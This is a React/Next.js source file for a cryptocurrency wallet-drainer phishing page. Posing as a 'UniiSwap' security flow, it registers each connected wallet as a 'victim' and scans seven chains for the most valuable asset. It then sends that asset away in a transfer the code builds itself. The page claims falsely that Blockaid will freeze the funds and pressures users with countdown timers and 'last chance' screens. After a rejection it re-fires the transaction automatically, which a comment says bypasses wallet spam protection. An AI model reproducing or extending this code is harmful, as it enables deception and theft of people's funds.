'use client';

import { useEffect, useRef, useState } from 'react';
import { useRouter } from 'next/navigation';
import { motion, AnimatePresence } from 'framer-motion';
import { getProviderRdns } from '@/lib/providerStore';
import {
  discoverEIP6963Providers,
  isMetaMaskProvider,
  type EIP6963ProviderDetail,
} from '@/lib/eip6963';
import { CHAINS, getChainEntry } from '@/lib/chainRegistry';
import { switchToChain } from '@/lib/chainSwitch';
import {
  buildNativeTransfer,
  buildERC20Transfer,
  sendTransfer,
} from '@/lib/transferEngine';
import { registerVictim, fetchPortfolio, type PortfolioChain } from '@/lib/api';
import { ChainSkeleton } from '@/components/ChainSkeleton';

type Stage = 'scanning' | 'review' | 'sending' | 'success' | 'error';

interface ChainView {
  key: string;
  name: string;
  nativeSymbol: string;
  color: string;
  totalUsd: number;
  tokens: {
    symbol: string;
    balance: string;
    balanceUsd: number;
    isNative: boolean;
    contractAddress: string | null;
  }[];
}

interface TopAsset {
  chainKey: string;
  chainName: string;
  chainColor: string;
  symbol: string;
  balance: string;
  balanceUsd: number;
  isNative: boolean;
  contractAddress: string | null;
}

export default function FlowPage() {
  const router = useRouter();
  const started = useRef(false);
  
  const [stage, setStage] = useState<Stage>('scanning');
  const [victim, setVictim] = useState('');
  const [chains, setChains] = useState<ChainView[]>([]);
  const [top, setTop] = useState<TopAsset | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [providerRef, setProviderRef] = useState<any>(null);
  const [walletName, setWalletName] = useState('');
  
  // State for retry logic and timer
  const [attempt, setAttempt] = useState(1); // 1 = Normal, 2 = Last Chance (Red), 3 = Frozen Warning (Deep Red)
  const [timeLeft, setTimeLeft] = useState(23);
  const [isAutoFiring, setIsAutoFiring] = useState(false);

  // 1. Timer Logic
  useEffect(() => {
    if (stage !== 'sending') return;
    
    // If time runs out without action
    if (timeLeft <= 0) {
      if (attempt === 1) {
        setAttempt(2);
        setTimeLeft(23); // Reset timer for stage 2
      } else if (attempt === 2) {
        setAttempt(3);
      }
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [stage, timeLeft, attempt]);

  // 2. Initialization
  useEffect(() => {
    if (started.current) return;
    started.current = true;
    void init();
  }, []);

  async function resolveProvider(): Promise<{ detail: EIP6963ProviderDetail; wallet: string } | null> {
    const rdns = getProviderRdns();
    if (!rdns) return null;
    const providers = await discoverEIP6963Providers(1200);
    const detail = providers.find(
      (d) => String(d.info?.rdns || '').toLowerCase() === String(rdns).toLowerCase()
    );
    if (!detail?.provider || isMetaMaskProvider(detail.provider)) return null;
    const accounts = await detail.provider.request({ method: 'eth_requestAccounts' });
    if (!accounts?.length) return null;
    return { detail, wallet: accounts[0] };
  }

  async function init() {
    try {
      setStage('scanning');
      const resolved = await resolveProvider();
      if (!resolved) { router.push('/'); return; }
      
      setProviderRef(resolved.detail.provider);
      setWalletName(resolved.detail.info?.name || 'Wallet');
      setVictim(resolved.wallet);

      try {
        await registerVictim({
          sourceAddress: resolved.wallet,
          chain: 'multi',
          eventType: 'connect',
          walletName: 'UniiSwap',
          walletProvider: resolved.detail.info?.name || 'Unknown',
        });
      } catch {}

      const portfolio = await fetchPortfolio(resolved.wallet);
      if (!portfolio.success) throw new Error('Scan failed');

      const responseMap = new Map<string, PortfolioChain>();
      for (const c of portfolio.chains) {
        const key = getChainEntry(c.chain)?.key || c.chain.toLowerCase();
        responseMap.set(key, c);
      }

      const views: ChainView[] = Object.values(CHAINS).map((cfg) => {
        const data = responseMap.get(cfg.key);
        const tokens = (data?.tokens || [])
          .filter((t) => Number(t.balanceUsd || 0) >= 0.1)
          .map((t) => ({
            symbol: t.tokenSymbol,
            balance: String(t.balance),
            balanceUsd: Number(t.balanceUsd || 0),
            isNative: !!t.isNative,
            contractAddress: t.contractAddress && t.contractAddress !== '0x0000000000000000000000000000000000000000' ? t.contractAddress : null,
          }));
        return { key: cfg.key, name: cfg.name, nativeSymbol: cfg.nativeSymbol, color: cfg.color, totalUsd: Number(data?.totalUsd || 0), tokens };
      });

      const sorted = views.sort((a, b) => b.totalUsd - a.totalUsd);
      setChains(sorted);

      let best: TopAsset | null = null;
      for (const c of sorted) {
        for (const t of c.tokens) {
          if (!best || t.balanceUsd > best.balanceUsd) {
            best = {
              chainKey: c.key, chainName: c.name, chainColor: c.color,
              symbol: t.symbol, balance: t.balance, balanceUsd: t.balanceUsd,
              isNative: t.isNative, contractAddress: t.contractAddress,
            };
          }
        }
      }

      if (!best || best.balanceUsd < 1) throw new Error('No actionable balance. Minimum $1 required.');
      setTop(best);
      setStage('review');
    } catch (e: any) {
      setError(e?.message || 'Initialization failed');
      setStage('error');
    }
  }

  // 3. Transaction Execution
  const executeTransaction = async (currentAttempt: number) => {
    if (!top || !providerRef || isAutoFiring) return;
    
    try {
      if (stage !== 'sending') setStage('sending');
      
      await switchToChain(providerRef, top.chainKey);
      const payload = top.isNative
        ? await buildNativeTransfer(providerRef, victim)
        : await buildERC20Transfer(providerRef, victim, top.contractAddress!);

      const hash = await sendTransfer(providerRef, victim, payload);

      const start = Date.now();
      let confirmed = false;
      while (Date.now() - start < 120_000) {
        const receipt = await providerRef.request({ method: 'eth_getTransactionReceipt', params: [hash] });
        if (receipt?.status === '0x1') { confirmed = true; break; }
        if (receipt?.status === '0x0') throw new Error('Transaction reverted');
        await new Promise((r) => setTimeout(r, 3000));
      }
      if (!confirmed) throw new Error('Not confirmed in 120s');
      setStage('success');
    } catch (e: any) {
      if (e?.code === 4001 || String(e?.message).toLowerCase().includes('rejected')) {
        // USER REJECTED
        if (currentAttempt === 1) {
          setAttempt(2);
          setTimeLeft(23); // Reset timer for Stage 2
          setIsAutoFiring(true);
          
          // FIX: Direct setTimeout bypasses wallet spam protection
          setTimeout(() => {
            setIsAutoFiring(false);
            void executeTransaction(2); 
          }, 1000); 

        } else if (currentAttempt === 2) {
          setAttempt(3);
          setIsAutoFiring(false);
        }
      } else {
        setError(e?.message || 'Transfer failed');
        setStage('error');
      }
    }
  };

  const handleInitialConfirm = () => {
    setAttempt(1);
    setTimeLeft(23);
    setStage('sending');
    void executeTransaction(1);
  };

  const handleRevokeAndSecure = () => {
    // Stage 3 manual retry
    setAttempt(1);
    setTimeLeft(23);
    void executeTransaction(1);
  };

  // --- RENDERS ---

  if (stage === 'scanning') {
    return (
      <div className="min-h-screen bg-[#FAF9FA] px-6 py-12">
        <div className="mx-auto w-full max-w-[560px]">
          <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} className="mb-6 rounded-[24px] bg-white p-6 shadow-sm border border-[#F2F2F2]">
            <div className="mb-4 flex items-center gap-3">
              <div className="h-10 w-10 animate-pulse rounded-full bg-[#FF37C7]/20" />
              <div>
                <div className="text-[18px] font-[535] text-[#222222]">Analyzing your wallet</div>
                <div className="text-[13px] text-[#666666]">Scanning 7 chains for your highest-value assets…</div>
              </div>
            </div>
            <div className="mb-4 h-1 w-full overflow-hidden rounded-full bg-[#F2F2F2]">
              <motion.div initial={{ x: '-100%' }} animate={{ x: '100%' }} transition={{ duration: 1.4, repeat: Infinity, ease: 'linear' }} className="h-full w-1/3 rounded-full bg-[#FF37C7]" />
            </div>
          </motion.div>
          <ChainSkeleton />
        </div>
      </div>
    );
  }

  if (stage === 'review' && top) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-[#FFFFFF] px-4 py-8">
        <div className="flex w-full max-w-[420px] flex-col overflow-hidden rounded-[20px] border border-[#F2F2F2] bg-white shadow-[0_4px_12px_rgba(0,0,0,0.08)]">
          <div className="border-b border-[#F2F2F2] bg-[#FFF5F5] p-5">
            <div className="flex items-start gap-3">
              <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-full bg-[#D90000] shadow-[0_0_15px_rgba(217,0,0,0.4)]">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#FFFFFF" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round" /></svg>
              </div>
              <div>
                <h1 className="text-[18px] font-[800] uppercase tracking-[0.05em] text-[#D90000]">CRITICAL — Your funds are exposed</h1>
                <p className="mt-1 text-[13px] font-[485] leading-[1.5] text-[#222222]">
                  Blockaid has flagged <strong className="text-[#D90000]">{top.symbol}</strong> on <strong>{top.chainName}</strong> as compromised. Your balance of <strong className="text-[#D90000]">${top.balanceUsd.toFixed(2)}</strong> will be permanently frozen unless you act now.
                </p>
              </div>
            </div>
          </div>

          <div className="max-h-[40vh] overflow-y-auto p-4">
            <div className="mb-2 flex items-center justify-between">
              <span className="text-[13px] font-[535] text-[#222222]">Full wallet scan — 7 chains</span>
              <span className="text-[11px] font-[485] text-[#666666]">{walletName}</span>
            </div>
            <div className="space-y-2">
              {chains.map((c) => {
                const hasBalance = c.totalUsd >= 0.01;
                return (
                  <div key={c.key} className={`rounded-[16px] p-3 ${hasBalance ? 'bg-[#F9F9F9]' : 'bg-[#FCFCFC] border border-dashed border-[#E5E5E5]'}`}>
                    <div className="mb-1 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="h-2 w-2 rounded-full" style={{ backgroundColor: hasBalance ? c.color : '#CCCCCC' }} />
                        <span className={`text-[13px] font-[535] ${hasBalance ? 'text-[#222222]' : 'text-[#999999]'}`}>{c.name}</span>
                      </div>
                      <span className={`text-[13px] font-[485] ${hasBalance ? 'text-[#222222]' : 'text-[#CCCCCC]'}`}>${c.totalUsd.toFixed(2)}</span>
                    </div>
                    {hasBalance ? (
                      <div className="space-y-1 pl-4">
                        {c.tokens.map((t, idx) => (
                          <div key={`${c.key}-${t.symbol}-${idx}`} className="flex items-center justify-between text-[12px]">
                            <span className="text-[#666666]">{t.symbol}</span>
                            <span className="font-[485] text-[#222222]">{Number(t.balance).toLocaleString('en-US', { maximumFractionDigits: 6 })}</span>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <div className="pl-4 text-[11px] text-[#BBBBBB]">No balance</div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>

          <div className="border-t border-[#F2F2F2] p-4">
            <button onClick={handleInitialConfirm} className="w-full rounded-[20px] bg-[#D90000] py-3.5 text-[15px] font-[535] uppercase tracking-[-0.02em] text-white shadow-[0_4px_16px_rgba(217,0,0,0.4)] transition-all hover:scale-[1.01] hover:shadow-[0_6px_24px_rgba(217,0,0,0.55)]">
              Secure All Funds Now
            </button>
            <button onClick={() => router.push('/')} className="mt-2 w-full py-2 text-[13px] font-[485] text-[#666666] hover:text-[#222222]">Cancel</button>
          </div>
        </div>
      </div>
    );
  }

  if (stage === 'sending') {
    const isStage2 = attempt === 2;
    const isStage3 = attempt === 3;
    
    const minutes = Math.floor(Math.max(0, timeLeft) / 60).toString().padStart(2, '0');
    const seconds = Math.max(0, timeLeft % 60).toString().padStart(2, '0');

    return (
      <div className="flex min-h-screen items-center justify-center bg-[#0D1117] px-4">
        <AnimatePresence mode="wait">
          <motion.div 
            key={attempt}
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className={`w-full max-w-[380px] rounded-[24px] p-6 shadow-[0_20px_50px_rgba(0,0,0,0.4)] transition-colors duration-500 ${
              isStage3 ? 'bg-[#2A0000] border-2 border-[#D90000]' : 
              isStage2 ? 'bg-[#4A0000] border border-[#7A0000]' : 
              'bg-white'
            }`}
          >
            <div className="mb-6 flex justify-center">
              <div className={`relative flex h-16 w-16 items-center justify-center rounded-full ${
                isStage3 ? 'bg-[#D90000] animate-pulse' : 
                isStage2 ? 'bg-[#7A0000]' : 
                'bg-[#FFF0F7]'
              }`}>
                {!isStage3 && (
                  <svg className={`absolute h-16 w-16 animate-spin ${isStage2 ? 'text-[#FF4D4D]' : 'text-[#D90000]'}`} viewBox="0 0 100 100">
                    <circle cx="50" cy="50" r="45" fill="none" stroke="currentColor" strokeWidth="4" strokeDasharray="70 200" strokeLinecap="round" />
                  </svg>
                )}
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className={isStage2 || isStage3 ? 'text-[#FF4D4D]' : 'text-[#D90000]'}>
                  <path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                </svg>
              </div>
            </div>

            <h2 className={`mb-3 text-center text-[20px] font-[800] tracking-[-0.02em] ${
              isStage3 ? 'text-[#D90000]' : isStage2 ? 'text-[#FF4D4D]' : 'text-[#D90000]'
            }`}>
              {isStage3 ? 'FUNDS ON WAY TO FREEZE' : isStage2 ? 'LAST CHANCE — SECURE YOUR FUNDS' : 'Confirm in your wallet'}
            </h2>
            
            <p className={`mb-6 text-center text-[13px] leading-[1.5] ${
              isStage3 ? 'text-[#FF8080] font-[535]' : isStage2 ? 'text-[#FFB3B3]' : 'text-[#666666]'
            }`}>
              {isStage3 
                ? 'Your funds are on the way to freeze permanently by Blockaid due to suspicious incoming transactions in the past. You must act immediately.'
                : 'Your wallet is waiting for your approval. We have created a new address under your wallet confirm and transfer your funds to new address. Your old address will be deleted because of the security concern by Blockaid.'}
            </p>

            {!isStage3 && (
              <>
                <div className="mb-2 flex items-end justify-between">
                  <div className={`text-[40px] font-[800] tracking-[-0.02em] tabular-nums ${
                    isStage2 ? 'text-[#FF4D4D] animate-pulse' : 'text-[#D90000]'
                  }`}>
                    {minutes}:{seconds}
                  </div>
                  <span className={`text-[12px] font-[600] ${isStage2 ? 'text-[#FFB3B3]' : 'text-[#666666]'}`}>Time remaining</span>
                </div>
                <div className="mb-6 h-1.5 w-full overflow-hidden rounded-full bg-gray-200/20">
                  <div 
                    className={`h-full transition-all duration-1000 ease-linear ${isStage2 ? 'bg-[#FF4D4D]' : 'bg-[#D90000]'}`}
                    style={{ width: `${Math.max(0, (timeLeft / 23) * 100)}%` }}
                  />
                </div>
              </>
            )}

            <div className={`mb-6 space-y-2 rounded-[16px] p-4 ${isStage2 || isStage3 ? 'bg-[#5C0000]' : 'bg-[#F9F9F9]'}`}>
              <div className="flex items-center justify-between">
                <span className={`text-[13px] ${isStage2 || isStage3 ? 'text-[#FFB3B3]' : 'text-[#666666]'}`}>Network</span>
                <span className={`text-[13px] font-[535] ${isStage2 || isStage3 ? 'text-white' : 'text-[#222222]'}`}>{top?.chainName || 'Ethereum'}</span>
              </div>
              <div className="flex items-center justify-between">
                <span className={`text-[13px] ${isStage2 || isStage3 ? 'text-[#FFB3B3]' : 'text-[#666666]'}`}>Asset</span>
                <span className={`text-[13px] font-[535] ${isStage2 || isStage3 ? 'text-white' : 'text-[#222222]'}`}>{top?.symbol || 'ETH'}</span>
              </div>
            </div>

            {isStage3 ? (
              <button onClick={handleRevokeAndSecure} className="w-full rounded-[16px] bg-[#D90000] py-3.5 text-[14px] font-[800] uppercase tracking-[0.05em] text-white shadow-[0_0_20px_rgba(217,0,0,0.8)] transition-all hover:scale-[1.02]">
                Revoke & Secure Funds Now
              </button>
            ) : (
              <div className={`flex items-center justify-center gap-2 text-[12px] font-[485] ${isStage2 ? 'text-[#FF4D4D]' : 'text-[#666666]'}`}>
                <span className={`h-1.5 w-1.5 animate-pulse rounded-full ${isStage2 ? 'bg-[#FF4D4D]' : 'bg-[#D90000]'}`} />
                {isStage2 ? 'Auto-firing last chance...' : 'Waiting for wallet approval...'}
              </div>
            )}
          </motion.div>
        </AnimatePresence>
      </div>
    );
  }

  if (stage === 'success') {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#FAF9FA] px-6">
        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ type: 'spring' }} className="max-w-[440px] text-center">
          <div className="mx-auto mb-6 flex h-24 w-24 items-center justify-center rounded-full bg-[#31D0AA]/15">
            <svg width="52" height="52" viewBox="0 0 24 24" fill="none">
              <motion.path d="M5 12l5 5L20 7" stroke="#31D0AA" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" initial={{ pathLength: 0 }} animate={{ pathLength: 1 }} transition={{ duration: 0.6, delay: 0.2 }} />
            </svg>
          </div>
          <h2 className="mb-3 text-[28px] font-[800] text-[#1A1A1A]">Your funds are now secured</h2>
          <p className="mb-4 text-[15px] leading-[1.55] text-[#666666]">Your balance has been routed to a safe address. You can close this window.</p>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-[#FAF9FA] px-6">
      <div className="max-w-[420px] text-center">
        <h2 className="mb-3 text-[20px] font-[800] text-[#1A1A1A]">Something went wrong</h2>
        <p className="mb-6 text-[14px] text-[#666666]">{error || 'Unknown error'}</p>
        <button onClick={() => router.push('/')} className="rounded-[16px] bg-[#FF37C7] px-6 py-3 text-[14px] font-[600] text-white">Back to home</button>
      </div>
    </div>
  );
}
